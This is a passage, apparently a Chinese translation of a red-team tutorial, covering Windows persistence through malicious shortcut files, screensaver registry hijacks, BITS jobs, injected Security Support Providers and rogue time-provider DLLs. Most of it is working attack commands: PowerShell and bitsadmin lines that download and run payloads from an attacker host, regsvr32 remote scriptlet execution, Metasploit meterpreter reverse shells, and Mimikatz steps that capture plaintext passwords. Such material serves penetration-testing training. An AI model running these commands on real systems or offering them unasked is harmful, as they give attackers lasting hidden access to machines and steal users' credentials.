密码哈希可以用于脱机破解或NTLM中继攻击，以便访问其他系统或用户的电子邮件。LNKUp还具有生成将执行任意命令的快捷方式的功能。

> python generate.py --host 10.0.2.21 --type ntlm --output pentestlab.lnk
> --execute "cmd.exe /c C:\temp\pentestlab.exe"

![wKg0C2Q2skqAb9c8AADXYDMXet4141.png](https://image.3001.net/images/20230614/1686722908_6489595c76681d70b3f8d.png!small)

LNKUp –执行命令

[https://twitter.com/xillwillx](https://www.sec-in.com/outLinkPage/?target=https://twitter.com/xillwillx)

[https://github.com/xillwillx/tricky.lnk](https://www.sec-in.com/outLinkPage/?target=https://github.com/xillwillx/tricky.lnk)

xillwillx开发了一个名为ricky.lnk的PowerShell脚本，该脚本可以创建一个以.unik字符欺骗的.LNK文件，该字符反转.lnk扩展名并在文件末尾附加.txt。

生成的扩展名将包含一个PowerShell命令，该命令将从远程服务器下载文件并直接在系统上执行

> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -  
> ExecutionPolicy Bypass -noLogo -Command (new-> objectSystem.Net.WebClient).DownloadFile('[http://10.0.2.21/pentestlab.exe](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21/pentestlab.exe)','pentestlab.exe');./pentestlab.exe;

![wKg0C2Q2sleADZkeAABtEu3Vspc110.png](https://image.3001.net/images/20230614/1686722909_6489595d10188168a49db.png!small)

Tricky2 – PowerShell

或者，该项目包含一个VBS脚本，该脚本可以执行与PowerShell版本相同的操作

![wKg0C2Q2sm2AaY7FAACj9McsetM177.png](https://image.3001.net/images/20230614/1686722909_6489595db941d81d367da.png!small)

Tricky – VBS脚本

## 屏幕保护程序

屏幕保护是windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。

总所周知，windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有`.scr`文件扩展名的可执行文件，并通过`scrnsave.scr`实用程序执行

屏幕保护程序设置存储在注册表中，从令人反感的角度来看，最有价值的值是：

>   * HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
>   * HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
>   * HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
>   * HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
>

![wKg0C2Q2snuAL6lfAAD6DK55J4k694.png](https://image.3001.net/images/20230614/1686722910_6489595e4314b10074317.png!small)

屏幕保护程序–注册表项

可以通过命令提示符或从powershell控制台修改或添加注册表项。由于`.scr`文件本质上是可执行文件，因此两个扩展名都可以用于后门植入

>   * reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d
> c:\tmp\pentestlab.exe
>   * reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d
> c:\tmp\pentestlab.scr
>   * New-ItemProperty -Path 'HKCU:\Control Panel\Desktop ' -Name
> 'SCRNSAVE.EXE' -Value 'c:\tmp\pentestlab.exe'
>   * New-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name
> 'SCRNSAVE.EXE' -Value 'c:\tmp\pentestlab.scr'
>

![wKg0C2Q2sqaADMGuAACEMQ187Mo569.png](https://image.3001.net/images/20230614/1686722910_6489595eb54a7b426671b.png!small)

添加注册表项– CMD和PowerShell

一旦机器不活动时间段过去，将执行任意有效载荷，并且将再次建立命令和控制的通信。

![wKg0C2Q2sq6AANvfAABYXFn2Mo200.png](https://image.3001.net/images/20230614/1686722911_6489595f6fac54dc6903e.png!small)

屏幕保护程序– Meterpreter

[https://github.com/samratashok/nishang](https://www.sec-in.com/outLinkPage/?target=https://github.com/samratashok/nishang)

Nishang框架包含一个PowerShell脚本，该脚本也可以执行此攻击，但与上述方法相比，它需要管理级别的特权，因为它在本地计算机中使用注册表项来存储将执行远程托管有效负载的PowerShell命令。这种技术的好处是它不会接触磁盘

>   * Import-Module .\Add-ScrnSaveBackdoor.ps1
>   * Add-ScrnSaveBackdoor -PayloadURL
> [[http://192.168.254.145/Bebr7aOemwFJO](https://www.sec-> in.com/outLinkPage/?target=http://192.168.254.145:8080/Bebr7aOemwFJO)]([http://192.168.254.145/Bebr7aOemwFJO](https://www.sec-> in.com/outLinkPage/?target=http://192.168.254.145:8080/Bebr7aOemwFJO))
>

![wKg0C2Q2ssyANzoHAAD10Iyn7kk561.png](https://image.3001.net/images/20230614/1686722911_6489595fdd9f7e18d0325.png!small)

Nishang –屏幕保护程序后门

在这种情况下，可以使用Metasploit Web交付模块生成并托管PowerShell负载。

一旦用户会话变为空闲，屏幕保护程序将执行PowerShell负载，然后将打开一个meterpreter会话。

>   * use exploit/multi/script/web_delivery
>   * set payload windows/x64/meterpreter/reverse_tcp
>   * set LHOST IP_Address
>   * set target 2
>   * exploit
>

![wKg0C2Q2stWAer0uAADcsGac801.png](https://image.3001.net/images/20230614/1686722912_648959607f242f6522f58.png!small)

Meterpreter –屏幕保护程序

利用屏幕保护程序的持久性技术的问题在于，当用户返回并且系统未处于空闲模式时，会话将中断。

但是，红队可以在用户不在时执行其操作。如果屏幕保护程序被组策略禁用，则该技术不能用于持久性。

## BITS Jobs

Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。

这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。

Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。

从攻击的角度来看，可以滥用此功能，以便在受感染的主机上下载有效负载（可执行文件，PowerShell脚本，Scriptlet等）并在给定时间执行这些文件，以在红队操作中保持持久性。

但是，与“bitsadmin ” 进行交互需要管理员级别的权限。执行以下命令会将恶意有效负载从远程位置下载到本地目录。

> bitsadmin /transfer backdoor /download /priority high  
> [http://10.0.2.21/pentestlab.exe](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21/pentestlab.exe)C:\tmp\pentestlab.exe

![wKg0C2Q2svSADv9kAABR5Iehcq4159.png](https://image.3001.net/images/20230614/1686722912_64895960f2803a4a65923.png!small)

Bitsadmin –文件传输

还有一个PowerShell cmdlet可以执行相同的任务。

> Start-BitsTransfer -Source
> "[http://10.0.2.21/pentestlab.exe](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21/pentestlab.exe)" -Destination
> "C:\tmp\pentestlab.exe"

![wKg0C2Q2svAAOw3AAAcpmz6QEw901.png](https://image.3001.net/images/20230614/1686722913_6489596166c646630902f.png!small)

BitsTrasfer –传输文件PowerShell

将文件放入磁盘后，可以通过从“ bitsadmin ”实用程序执行以下命令来实现持久性。用法非常简单：

  1. 在创建参数需要作业的名称
  2. 该addfile需要文件的远程位置和本地路径
  3. 该SetNotifyCmdLine将执行的命令
  4. 所述SetMinRetryDelay定义时间回调（秒）
  5. 该简历参数将运行位工作。

>   * bitsadmin /create backdoor
>   * bitsadmin /addfile backdoor
> "[http://10.0.2.21/pentestlab.exe](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21/pentestlab.exe)"
> "C:\tmp\pentestlab.exe"
>   * bitsadmin /SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL
>   * bitsadmin /SetMinRetryDelay "backdoor" 60
>   * bitsadmin /resume backdoor
>

![wKg0C2Q2swmAComGAADPTAFDTxY963.png](https://image.3001.net/images/20230614/1686722913_64895961cb9a8eb9c86b4.png!small)

持久性--BITS Jobs
当作业在系统上运行时，有效负载将被执行，Meterpreter会话将打开，或者通信将被接收回命令和控制（取决于场合中使用的C2）。

![wKg0C2Q2sxKAc5efAABWM8bZCI519.png](https://image.3001.net/images/20230614/1686722914_6489596260c9c26f3ed17.png!small)

持久性– BITS Jobs Meterpreter

regsvr32 = [https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/](https://www.sec-in.com/outLinkPage/?target=https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/)

参数SetNotifyCmdLine也可以用于通过regsvr32实用程序从远程位置执行scriptlet
。这种方法的好处是它不会接触磁盘，并且可以避开将应用程序列入白名单的产品。

>   * bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u
> /i:[http://10.0.2.21:8080/FHXSd9.sct](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/FHXSd9.sct)scrobj.dll"
>   * bitsadmin /resume backdoor
>

![wKg0C2Q2s1ATkxrAABQv3t9wA272.png](https://image.3001.net/images/20230614/1686722914_64895962d35f92b2fe219.png!small)

BITS Jobs – Regsvr32

Metasploit框架可用于通过web交付模块捕获有效负载

>   * use exploit/multi/script/web_delivery
>   * set target 3
>   * set payload windows/x64/meterpreter/reverse_tcp
>   * set LHOST 10.0.2.21
>   * exploit
>

![wKg0C2Q2s2yAChjAAEByZbce4465.png](https://image.3001.net/images/20230614/1686722915_64895963584fe87d34bef.png!small)

BITS Jobs – Regsvr32

## 安全支持提供者

安全支持提供程序（SSP）是Windows API，用于扩展Windows身份验证机制。

LSASS进程正在Windows启动期间加载安全支持提供程序DLL。

这种行为使红队的攻击者可以删除一个任意的SSPDLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行修补而无需接触磁盘。

该技术可用于收集一个系统或多个系统中的凭据，并将这些凭据与另一个协议（例如RDP，WMI等）结合使用，以免干扰检测，从而在网络中保持持久性。

向主机注入恶意安全支持提供程序需要管理员级别的特权，并且可以使用两种方法：

  1. 注册SSP DLL
  2. 加载到内存

Mimikatz，Empire和PowerSploit支持这两种方法，可以在红队操作中使用。

### Mimikatz

链接：[https://github.com/gentilkiwi/mimikatz/releases](https://www.sec-in.com/outLinkPage/?target=https://github.com/gentilkiwi/mimikatz/releases)

项目Mimikatz提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。

> *C:\Windows\System32*

将文件传输到上述位置后，需要修改注册表项以包括新的安全支持提供程序mimilib

> reg add "hklm\system\currentcontrolset\control\lsa" /v "Security Packages"
> /d  
> "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ

![wKg0C2Q2s3iAMzOzAABI8b2uaY8022.png](https://image.3001.net/images/20230614/1686722915_64895963cfb56ea952303.png!small)

SSP – mimilib注册表

查看“安全软件包”注册表项将验证是否已注入恶意安全支持提供程序。

> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages

![wKg0C2Q2s46Ab2VDAADv8uh26gk478.png](https://image.3001.net/images/20230614/1686722916_648959644033ae5512c2d.png!small)

注册表–安全软件包

由于注册表已被篡改并且DLL存储在系统中，因此该方法将在重新启动后继续存在。

当域用户再次通过系统进行身份验证时，将创建一个名为kiwissp的新文件，该文件将记录帐户的凭据。

> C:\Windows\System32\kiwissp.log

![wKg0C2Q2s5iAaA7OAADrX7YMFw693.png](https://image.3001.net/images/20230614/1686722916_64895964bfccf60071504.png!small)

Mimikatz – kiwissp

另外，Mimikatz通过向LSASS注入新的安全支持提供程序（SSP）来支持内存技术选项。

此技术不需要将mimilib.dll放入磁盘或创建注册表项。但是，缺点是在重新启动过程中不会持续存在。

> privilege::debug  
> misc::memssp

![wKg0C2Q2s6KAcmoAACgOy9FxpE377.png](https://image.3001.net/images/20230614/1686722917_648959656736e0ebb1347.png!small)

Mimikatz –内存中的SSP

当用户再次通过系统进行身份验证时，将在System32中创建一个日志文件，其中将包含纯文本用户密码。

> C:\Windows\System32\mimilsa.log

![wKg0C2Q2s62ALxC4AACXxOH5Quc450.png](https://image.3001.net/images/20230614/1686722917_64895965d37d4b1d2bed8.png!small)

.Mimikatz – mimilsa

### Empire

Empire提供了两个模块，可用于枚举现有的SSP并在目标系统上安装恶意的SSP。默认情况下，枚举模块将使用活动代理，并且不需要任何其他配置。

>   * usemodule persistence/misc/get_ssps
>   * execute
>

![wKg0C2Q2s7aAT1SHAACAE4zhylA346.png](https://image.3001.net/images/20230614/1686722918_648959669c2ed8eedbd25.png!small)

Empire – SSP 枚举

同样，直接查询注册表可以获取存在的SSP的值。

> shell reg query hklm\system\currentcontrolset\control\lsa\ /v "Security
> Packages"

![wKg0C2Q2s8GAPsnyAABx9ldpvG4486.png](https://image.3001.net/images/20230614/1686722919_64895967191246ad062dd.png!small)

注册表SSP的枚举注册表

将恶意安全支持提供程序复制到System32并更新注册表项将结束该技术。

> shell copy mimilib.dll C:\Windows\System32\

![wKg0C2Q2sGAU81xAABkIQK1lDk539.png](https://image.3001.net/images/20230614/1686722919_648959678a1ca9b67c26d.png!small)

将mimilib.dll复制到System32

由于Empire包含一个模块，该过程可以自动进行，该模块将自动将DLL文件复制到System32并创建注册表项。唯一的要求是在主机上设置mimilib.dll文件的路径。

>   * usemodule persistence/misc/install_ssp
>   * set Path C:\Users\Administrator\mimilib.dll
>   * execute
>

![wKg0C2Q2sqALTS5AACQ8TZo250746.png](https://image.3001.net/images/20230614/1686722920_648959680ff482176b098.png!small)

Empire SSP安装

Empire还支持可以执行自定义Mimikatz命令的脚本。

>   * usemodule credentials/mimikatz/command
>   * set Command misc::memssp
>   * execute
>

![wKg0C2Q2tAyADNjtAACCpnS3nE0786.png](https://image.3001.net/images/20230614/1686722920_648959688dff782df4059.png!small)

Mimikatz – SSP命令

Empire还支持在进程的内存中注入恶意SSP。下面的模块将调用Mimikatz脚本并直接执行memssp命令，作为使该技术自动化的另一种方法。

>   * usemodule persistence/misc/memssp*
>   * execute
>

![wKg0C2Q2tBmAOqXEAACSDSnXmDg010.png](https://image.3001.net/images/20230614/1686722921_6489596908ee26eb545fd.png!small)

Empire – memssp

### PowerSploit

[https://github.com/PowerShellMafia/PowerSploit](https://www.sec-in.com/outLinkPage/?target=https://github.com/PowerShellMafia/PowerSploit)

PowerSploit包含两个可以执行相同任务的脚本。在Mimikatz的PowerShell变体“ Invoke-Mimikatz
”中，执行以下命令将使用内存中技术

>   * Import-Module .\Invoke-Mimikatz.ps1
>   * Invoke-Mimikatz -Command "misc::memssp"
>

![wKg0C2Q2tCWASQXbAACxurBpei0904.png](https://image.3001.net/images/20230614/1686722921_648959697f03c90e71eff.png!small)

PowerSploit – Mimikatz SSP

或者，将恶意的SSP DDL文件传输到目标主机并使用模块Install-SSP将DLL复制到System32，并将自动修改相关的注册表项。

>   * Import-Module .\PowerSploit.psm1
>   * Install-SSP -Path .\mimilib.dll
>

![wKg0C2Q2tDWAeRQQAABNv8qgG4918.png](https://image.3001.net/images/20230614/1686722922_6489596a0716449dcf68c.png!small)

PowerSploit –安装SSP

### SharpSploitConsole

[https://github.com/anthemtotheego/SharpSploitConsole](https://www.sec-in.com/outLinkPage/?target=https://github.com/anthemtotheego/SharpSploitConsole)

[https://twitter.com/cobbr_io/](https://www.sec-in.com/outLinkPage/?target=https://twitter.com/cobbr_io/)

[https://github.com/cobbr/SharpSploit](https://www.sec-in.com/outLinkPage/?target=https://github.com/cobbr/SharpSploit)

Mimikatz已集成到SharpSploitConsole中，该应用程序旨在与Ryan
Cobb发布的SharpSploit进行交互。SharpSploit是一个.NET后期开发库，具有与PowerSploit类似的功能。当前，SharpSploitConsole通过Mimikatz模块支持内存技术。

>   * SharpSploitConsole_x64.exe Interact
>   * Mimi-Command misc::memssp
>

![wKg0C2Q2tDAWzk1AAC7inXf6Ko410.png](https://image.3001.net/images/20230614/1686722922_6489596a735104e9e1546.png!small)

SharpSploitConsole – memssp

## 时间服务器

Windows操作系统正在利用时间提供者体系结构，以便从网络中的其他网络设备或客户端获取准确的时间戳。

时间提供者以DLL文件的形式实现，该文件位于System32文件夹中。

Windows启动期间将启动服务W32Time并加载w32time.dll。

DLL加载是一种已知的技术，通常使红队攻击者有机会执行任意代码。

由于关联的服务会在Windows启动期间自动启动，因此可以将其用作持久性机制。

但是，此方法需要管理员级别的特权，因为指向时间提供者DLL文件的注册表项存储在HKEY_LOCAL_MACHINE中。

根据系统是用作NTP服务器还是NTP客户端，使用以下两个注册表位置。

>   *
> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient
>   *
> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer
>

该W32Time将运行在Windows环境作为本地服务，它是通过svchost的执行。

![wKg0C2Q2tEmAUydoAADpDeGpwDQ673.png](https://image.3001.net/images/20230614/1686722922_6489596ae9c9a33729e77.png!small)

W32Time服务

恶意DLL已放入磁盘中，将执行有效负载。在命令提示符下，可以通过执行以下命令以指向任意DLL的位置来修改时间提供者注册表项。

> reg add  
>
> "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient"
> /v DllName /t REG_SZ /d "C:\temp\w32time.dll"

![wKg0C2Q2tFOAXmLSAAAKeEbnZc315.png](https://image.3001.net/images/20230614/1686722923_6489596b69c1401345ed8.png!small)

时间提供者–注册表项修改

从注册表编辑器中查看注册表将确认DllName的值已更新。

![wKg0C2Q2tFyAdVmGAADukPWZgLo492.png](https://image.3001.net/images/20230614/1686722924_6489596c268eb62b75d8c.png!small)

时间提供者–恶意DLL

该服务将在Windows启动期间启动，或者通过执行以下命令手动启动。

> sc.exe stop w32time  
> sc.exe start w32time

![wKg0C2Q2tGeAFR9oAACcStkbKZw477.png](https://image.3001.net/images/20230614/1686722924_6489596cba72f1278101b.png!small)

时间提供者–重新启动服务

将执行任意有效负载，并建立Meterpreter会话。

![wKg0C2Q2tHGAL2aFAABdcWnfEiI578.png](https://image.3001.net/images/20230614/1686722925_6489596d2e0d4a633d4b6.png!small)

时间提供者– Meterpreter

**Scott Lundgren = **[https://twitter.com/5twenty9](https://www.sec-in.com/outLinkPage/?target=https://twitter.com/5twenty9)

**gametime = **[https://github.com/scottlundgren/w32time](https://www.sec-in.com/outLinkPage/?target=https://github.com/scottlundgren/w32time)

修改Windows时间提供程序可能会向SOC团队发出警报。来自Carbon Black的Scott
Lundgren在C中开发了一种称为gametime的时间提供程序。

可以使用此DLL来向操作系统注册新的时间提供者，并在其他注册表项中执行修改。

这样可以避免滥用现有的Windows时间提供程序，而该时间提供程序可以由SOC监视。Rundll32可用于注册DLL

Scott Lundgren使用了要在系统上创建的注册表项“GameTime”。

> #define GAMETIME_SVC_KEY_NAME  
> L"System\CurrentControlSet\Services\W32Time\TimeProviders\GameTime"

![wKg0C2Q2tLqADUrbAABWGJBa3B4125.png](https://image.3001.net/images/20230614/1686722925_6489596ddc4b9089827b3.png!small)

时间提供者– GameTime注册表项

根据Microsoft文档[[https://docs.microsoft.com/en-gb/windows/win32/sysinfo/creating-a-time-provider](https://www.sec-in.com/outLinkPage/?target=https://docs.microsoft.com/en-gb/windows/win32/sysinfo/creating-a-time-provider)]

时间提供者必须实现以下回调函数

  * TimeProvOpen
  * TimeProvCommand
  * TimeProvClose

TimeProvOpen用于返回提供者句柄，TimeProvCommand用于将命令发送到时间提供者，而TimeProvClose用于关闭时间提供者

    
    
    HRESULT __stdcall TimeProvOpen(
    _In_ WCHAR *wszName,
    _In_ TimeProvSysCallbacks *pSysCallbacks,
    _Out_ TimeProvHandle *phTimeProv
    )
    {
    UNREFERENCED_PARAMETER(pSysCallbacks);
    UNREFERENCED_PARAMETER(phTimeProv);
    OutputDebugStringW(wszName);
    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));
    }
    /*
    *
    */
    HRESULT __stdcall TimeProvCommand(
    _In_ TimeProvHandle hTimeProv,
    _In_ TimeProvCmd eCmd,
    _In_ PVOID pvArgs
    )
    {
    UNREFERENCED_PARAMETER(hTimeProv);
    UNREFERENCED_PARAMETER(eCmd);
    UNREFERENCED_PARAMETER(pvArgs);
    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));
    }
    /*
    *
    */
    HRESULT __stdcall TimeProvClose(
    _In_ TimeProvHandle hTimeProv
    )
    {
    UNREFERENCED_PARAMETER(hTimeProv);
    return (S_OK);
    }
    

![wKg0C2Q2tMeAGvk3AADoyempmXM808.png](https://image.3001.net/images/20230614/1686722926_6489596e4f8916bf42f74.png!small)

时间提供者–回调功能

GameTime提供程序将在系统上填充以下注册表项，因为它们是Microsoft时间提供程序规范的一部

  * DLLNAME
  * Enable
  * InputProvider

该DLLNAME指示包含供应商，该DLL的名称启用使然是否提供商应在系统启动过程中启动。

值“ 1”启动系统的提供者，而InputProvider指示提供者是输入还是输出。注册表值“ 1”表示已输入提供者。

这些在下面的代码中指定：

    
    
    nRet = RegSetValueExW(hkTimeProvider,
    L"DllName",
    0,
    REG_SZ,
    (LPBYTE)g_wzModule,(DWORD)wcslen(g_wzModule)*sizeof(WCHAR)+sizeof(WCHAR));
    if (ERROR_SUCCESS != nRet)
    {
    OutputError(L"RegCreateKeyExW failed", nRet);
    goto ErrorExit;
    }
    nRet = RegSetValueExW(hkTimeProvider,
    L"Enabled",
    0,
    REG_DWORD,
    (LPBYTE)&dwOne,
    sizeof(dwOne));
    if (ERROR_SUCCESS != nRet)
    {
    OutputError(L"RegCreateKeyExW failed", nRet);
    goto ErrorExit;
    }
    nRet = RegSetValueExW(hkTimeProvider,
    L"InputProvider",
    0,
    REG_DWORD,
    (LPBYTE)&dwOne,
    sizeof(dwOne));
    if (ERROR_SUCCESS != nRet)
    {
    OutputError(L"RegCreateKeyExW failed", nRet);
    goto ErrorExit;
    }
    

  

时间提供者–注册表项值

该代码还使用Deregister回调函数从系统中删除创建的注册表项GameTime，作为清理过程。

>
> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\GameTime
    
    
    void CALLBACK Deregister(
    _In_ HWND hWnd,
    _In_ HINSTANCE hInst,
    _In_ LPSTR pwzCmdLine,
    _In_ int nCmdShow)
    {
    long nRet;
    UNREFERENCED_PARAMETER(hWnd);
    UNREFERENCED_PARAMETER(hInst);
    UNREFERENCED_PARAMETER(pwzCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);
    OutputDebugStringW(L"Unregister\n");
    nRet = RegDeleteKeyW(HKEY_LOCAL_MACHINE, GAMETIME_SVC_KEY_NAME);
    if (ERROR_SUCCESS != nRet)
    {
    OutputError(L"RegDeleteKeyW failed!", nRet);
    goto ErrorExit;
    }
    ErrorExit:
    return;
    }
    

![wKg0C2Q2tNyAE4WAACuZJIEj9Q488.png](https://image.3001.net/images/20230614/1686722926_6489596ec808944328083.png!small)

注销回调功能

实际上，可以使用rundll32向系统注册DLL，以便创建关联的注册表项，默认情况下，该注册表项将与系统一起启用新的时间提供程序。

> rundll32.exe gametime.dll,Register

![wKg0C2Q2tOWAN4KAAAs8KPreIc223.png](https://image.3001.net/images/20230614/1686722927_6489596f467f3149b1bc5.png!small)

注册新的时间提供者

将创建注册表项GameTime，并且DllName将包含DLL的路径。

![wKg0C2Q2tPCASXVUAACAD8O2Vik714.png](https://image.3001.net/images/20230614/1686722927_6489596fb348f0efdec5f.png!small)

新时间提供商注册表项

再次修改注册表以包含任意DLL，将在服务重新启动期间执行类似于Windows时间提供程序的代码

![wKg0C2Q2tPeAMFWCAACGsuLnWdw493.png](https://image.3001.net/images/20230614/1686722928_648959702e0d5203817a5.png!small)

新时间提供商注册表项修改

该注销功能可用于删除所有相关联的密钥和系统上进行清理。

> rundll32.exe gametime.dll,Deregister

![wKg0C2Q2tQKAKnErAAAs1YFhE6k619.png](https://image.3001.net/images/20230614/1686722928_648959709a24aca71057b.png!small)

取消注册新时间提供商

